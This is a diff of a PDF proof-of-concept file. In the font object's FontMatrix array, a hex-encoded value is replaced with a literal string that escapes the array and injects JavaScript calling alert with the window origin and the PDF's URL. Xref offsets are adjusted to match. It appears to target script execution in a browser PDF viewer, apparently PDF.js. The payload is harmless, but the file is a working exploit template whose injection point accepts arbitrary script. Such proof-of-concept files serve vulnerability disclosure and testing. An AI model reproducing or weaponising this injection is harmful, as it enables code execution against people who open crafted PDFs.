@@ -16,7 +16,7 @@ BT /F1 18 Tf 100 700 Td (PoC File) Tj ET
 endstream
 endobj
 5 0 obj
-<< /Type /Font /Subtype /Type1 /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 <315c293b20616c6572745c28276f726967696e3a20272b77696e646f772e6f726967696e2b272c207064662075726c3a20275c2b5c2877696e646f772e5044465669657765724170706c69636174696f6e3f77696e646f772e5044465669657765724170706c69636174696f6e2e75726c3a646f63756d656e742e55524c5c2929> ] >>
+<< /Type /Font /Subtype /Type1 /BaseFont /SNCSTG+CMBX12 /FontDescriptor 6 0 R /FontMatrix [ 1 2 3 4 5 (1\); alert\('origin: '+window.origin+', pdf url: '+\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\)) ] >>
 endobj
 6 0 obj
 << /Type /FontDescriptor /FontName /SNCSTG+CMBX12 >>
@@ -29,9 +29,9 @@ xref
 0000000121 00000 n 
 0000000247 00000 n 
 0000000337 00000 n 
-0000000720 00000 n 
+0000000589 00000 n 
 trailer
 << /Size 7 /Root 1 0 R >>
 startxref
-788
+657
 %%EOF
